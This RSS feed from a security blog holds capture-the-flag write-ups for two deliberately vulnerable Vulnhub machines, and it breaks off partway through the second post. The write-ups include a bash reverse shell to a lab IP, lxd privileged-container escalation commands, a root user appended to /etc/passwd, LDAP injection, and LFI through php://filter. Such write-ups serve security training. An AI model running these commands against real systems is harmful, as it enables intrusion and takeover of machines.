<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Sudo on ikuamike</title><link>https://blog.ikuamike.io/tags/sudo/</link><description>Recent content in Sudo on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Â© Michael Ikua</copyright><lastBuildDate>Wed, 21 Apr 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/sudo/index.xml" rel="self" type="application/rss+xml"/><item><title>Vulnub: Misdirection 1</title><link>https://blog.ikuamike.io/posts/2021/misdirection1/</link><pubDate>Wed, 21 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/misdirection1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection.png" class="center" style="border-radius: 8px;" />
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Difficulty&lt;/th>
&lt;th>Release Date&lt;/th>
&lt;th>Author&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Beginner&lt;/td>
&lt;td>24 Sep 2019&lt;/td>
&lt;td>FalconSpy&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;p>For this box, initial access was a web shell discovered. Then with low priv shell we could run bash as brexit user
and were able to pivot to that account. Once we are brexit user, we abuse his membership to the lxd to start a
privileged container that can read and write the whole file system by mounting it in the container.&lt;/p>
&lt;h2 id="reconnaissance">Reconnaissance&lt;/h2>
&lt;p>Nmap&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
Host is up &lt;span style="color:#f92672">(&lt;/span>0.00032s latency&lt;span style="color:#f92672">)&lt;/span>.
Not shown: &lt;span style="color:#ae81ff">65531&lt;/span> closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
80/tcp open http Rocket httpd 1.2.6 &lt;span style="color:#f92672">(&lt;/span>Python 2.7.15rc1&lt;span style="color:#f92672">)&lt;/span>
3306/tcp open mysql MySQL &lt;span style="color:#f92672">(&lt;/span>unauthorized&lt;span style="color:#f92672">)&lt;/span>
8080/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;h3 id="8080-http">8080 (HTTP)&lt;/h3>
&lt;p>Nmap&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e"># Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136&lt;/span>
Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.136
Host is up &lt;span style="color:#f92672">(&lt;/span>0.00026s latency&lt;span style="color:#f92672">)&lt;/span>.
PORT STATE SERVICE VERSION
8080/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
| http-enum:
| /wordpress/: Blog
| /wordpress/wp-login.php: Wordpress login page.
| /css/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
| /debug/: Potentially interesting folder
| /development/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
| /help/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
| /images/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
| /js/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
| /manual/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
|_ /scripts/: Potentially interesting directory w/ listing on &lt;span style="color:#e6db74">&amp;#39;apache/2.4.29 (ubuntu)&amp;#39;&lt;/span>
|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
|_http-title: Apache2 Ubuntu Default Page: It works
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ffuf&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.136:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">js &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 322, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
help &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 324, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
wordpress &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 329, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
manual &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
debug &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
development &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 331, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
shell &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 325, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
images &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 326, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
css &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 323, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
scripts &lt;span style="color:#f92672">[&lt;/span>Status: 301, Size: 327, Words: 20, Lines: 10&lt;span style="color:#f92672">]&lt;/span>
server-status &lt;span style="color:#f92672">[&lt;/span>Status: 403, Size: 305, Words: 22, Lines: 12&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">[&lt;/span>Status: 200, Size: 10918, Words: 3499, Lines: 376&lt;span style="color:#f92672">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
contains a web shell.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-1.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="shell-as-www-data">Shell as www-data&lt;/h2>
&lt;p>Supplying the following command we are able to get a reverse shell.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">bash -c &lt;span style="color:#e6db74">&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>shell:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-2.png" class="center" style="border-radius: 8px;" />
&lt;p>After some basic enumeration we discover www-data has sudo permissions to run /bin/bash as brexit user without
any password requirement.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-3.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="shell-as-brexit">Shell as brexit&lt;/h2>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo -u brexit /bin/bash
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-4.png" class="center" style="border-radius: 8px;" />
&lt;p>On running id we see that brexit is in the lxd group and no images are present.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-10.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="shell-as-root">Shell as root&lt;/h2>
&lt;p>Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.&lt;/p>
&lt;p>First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
7z x distrobuilder-1.2.zip
cd distrobuilder-distrobuilder-1.2
make
&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can use go get as the repo instructions recommend but for me it didn&amp;rsquo;t work as expected.&lt;/p>
&lt;p>With distrobuilder ready, download the alpine image yaml file to build a small alpine image for lxd&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then run distrobuilder with the alpine yaml file as below.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo ~/bin/distrobuilder build-lxd alpine.yaml -o image.release&lt;span style="color:#f92672">=&lt;/span>3.8
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will result in two files: lxd.tar.xz and rootfs.squashfs.&lt;/p>
&lt;p>We then need to transfer this two files to our victim for privesc.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e"># on kali&lt;/span>
python3 -m http.server
&lt;span style="color:#75715e"># on victim&lt;/span>
wget 192.168.191.1:8000/lxd.tar.xz
wget 192.168.191.1:8000/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-5.png" class="center" style="border-radius: 8px;" />
&lt;p>After adding the image we need to run lxd init and can keep everything default.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">lxd init
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-7.png" class="center" style="border-radius: 8px;" />
&lt;p>Then create the container to be privileged and mount the host os file system inside it.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">lxc init alpine privesc -c security.privileged&lt;span style="color:#f92672">=&lt;/span>true
lxc config device add privesc host-root disk source&lt;span style="color:#f92672">=&lt;/span>/ path&lt;span style="color:#f92672">=&lt;/span>/mnt/root recursive&lt;span style="color:#f92672">=&lt;/span>true
lxc start privesc
lxc exec privesc /bin/sh
&lt;/code>&lt;/pre>&lt;/div>&lt;p>With this we can read the host file system from inside the container and can read root.txt.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-8.png" class="center" style="border-radius: 8px;" />
&lt;p>To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-9.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="extras">Extras&lt;/h2>
&lt;p>After looking at other writeups, there was another easy privesc that I didn&amp;rsquo;t explore.&lt;/p>
&lt;ul>
&lt;li>Writeable /etc/passwd file&lt;/li>
&lt;/ul>
&lt;p>The passwd file is writeable by the users in the brexit group.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-11.png" class="center" style="border-radius: 8px;" />
&lt;p>We can add user with id 0 that will give us root privileges.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">openssl passwd -1 -salt user password123
echo &lt;span style="color:#e6db74">&amp;#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&amp;#39;&lt;/span> &amp;gt;&amp;gt;/etc/passwd
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/misdirection1/misdirection-12.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="references">References&lt;/h2>
&lt;pre>&lt;code>https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/
https://www.hackingarticles.in/lxd-privilege-escalation/
https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd
&lt;/code>&lt;/pre></content></item><item><title>Vulnhub: Symfonos 5</title><link>https://blog.ikuamike.io/posts/2021/symfonos5/</link><pubDate>Wed, 17 Feb 2021 21:54:20 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos5/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Difficulty&lt;/th>
&lt;th>Release Date&lt;/th>
&lt;th>Author&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Beginner&lt;/td>
&lt;td>2 Mar 2020&lt;/td>
&lt;td>Zayotic&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>In this box, we first perform ldap injection on the web application to bypass the login page. Then we are able to read
local files by abusing a local file inclusion vulnerability with php base64 filter. From one of the php files we get
ldap credentials that we used to authenticate to ldap and dump entries. From the entries we get a base64 encoded
password that we could use to ssh into the machine. For privilege escalation to a root shell we abused sudo permission granted on
dpkg.&lt;/p>
&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
&lt;p>Nmap&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.132
Host is up &lt;span style="color:#f92672">(&lt;/span>0.0019s latency&lt;span style="color:#f92672">)&lt;/span>.
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
| ssh-hostkey:
| &lt;span style="color:#ae81ff">2048&lt;/span> 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
| &lt;span style="color:#ae81ff">256&lt;/span> a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
|_ &lt;span style="color:#ae81ff">256&lt;/span> 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
80/tcp open http Apache httpd 2.4.29 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
|_http-server-header: Apache/2.4.29 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
|_http-title: Site doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t have a title &lt;span style="color:#f92672">(&lt;/span>text/html&lt;span style="color:#f92672">)&lt;/span>.
389/tcp open ldap OpenLDAP 2.2.X - 2.3.X
636/tcp open ldapssl?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;h2 id="389636-ldap">389,636 (LDAP)&lt;/h2>
&lt;p>Doing some basic enumeration on ldap without credentials we only get the domain name. We&amp;rsquo;ll probably
get back to it incase we land on some credentials.&lt;/p>
&lt;p>&lt;strong>nmap scripts&lt;/strong>:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -p 389,636 --script ldap-* 192.168.191.132
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>ldapsearch&lt;/strong>:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -w &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h2 id="80-http">80 (HTTP)&lt;/h2>
&lt;p>Opening the site on the browser, we only get a plain page with an image.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Performing a directory/file bruteforce using ffuf, we discover new files.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t &lt;span style="color:#ae81ff">50&lt;/span> | tee root.ffuf
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Accessing /home.php we are redirected to admin.php which has a login form.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>I tried out credential bruteforce and sql injection auth bypass techniques but none of them were successful. I
then thought to try out ldap injection. Since we have ldap running on this host it could be a valid path.&lt;/p>
&lt;p>The application performs authentication insecurely by using GET requests to login.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Setting the username and password to &lt;code>*&lt;/code> we successfully login.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>We get redirected to home.php which doesn&amp;rsquo;t have much, but clicking on portraits we see interesting functionality.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>The url parameter takes in a url, changing the input to &lt;code>../../../../etc/passwd&lt;/code> we can read the passwd file. This confirms
we can abuse LFI to access other files on disk by directory traversal.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-9.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>I tried accessing log files to try for RCE like the previous boxes but nothing came up. We can still use this to read
files so we can check the source code of the app.&lt;/p>
&lt;p>Accessing the php files directly just executes them, so we need to use php wrappers.&lt;/p>
&lt;p>&lt;strong>home.php&lt;/strong>&lt;/p>
&lt;pre>&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;span style="color:#a6e22e">session_start&lt;/span>();
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#39;loggedin&amp;#39;&lt;/span>])){
&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Location: admin.php&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">exit&lt;/span>;
}
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>]))
{
$r &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#34;url&amp;#34;&lt;/span>];
$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">file_get_contents&lt;/span>($r);
}
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;nav class=&amp;#34;navbar navbar-expand-lg navbar-dark bg-dark&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;navbar-brand&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;symfonos&amp;lt;/a&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button class=&amp;#34;navbar-toggler&amp;#34; type=&amp;#34;button&amp;#34; data-toggle=&amp;#34;collapse&amp;#34; data-target=&amp;#34;#navbarColor02&amp;#34; aria-controls=&amp;#34;navbarColor02&amp;#34; aria-expanded=&amp;#34;false&amp;#34; aria-label=&amp;#34;Toggle navigation&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;span class=&amp;#34;navbar-toggler-icon&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;collapse navbar-collapse&amp;#34; id=&amp;#34;navbarColor02&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;ul class=&amp;#34;navbar-nav mr-auto&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php?url=http://127.0.0.1/portraits.php&amp;#34;&amp;gt;Portraits&amp;lt;/a&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;logout.php&amp;#34;&amp;gt;Logout&amp;lt;/a&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/li&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/ul&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/nav&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;center&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?php
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">if ($result){
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">echo $result;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">} else {
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">echo &amp;#34;&amp;lt;h3&amp;gt;Under Developement&amp;lt;/h3&amp;gt;&amp;#34;;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">} ?&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/center&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>admin.php&lt;/strong>&lt;/p>
&lt;pre>&lt;code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;span style="color:#a6e22e">session_start&lt;/span>();
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>){
&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">exit&lt;/span>;
}
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password) {
$ldap_ch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_connect&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;ldap://172.18.0.22&amp;#34;&lt;/span>);
&lt;span style="color:#a6e22e">ldap_set_option&lt;/span>($ldap_ch, &lt;span style="color:#a6e22e">LDAP_OPT_PROTOCOL_VERSION&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$ldap_ch) {
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
}
$bind &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_bind&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;cn=admin,dc=symfonos,dc=local&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;qMDdyZh3cT6eeAWD&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$bind) {
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
}
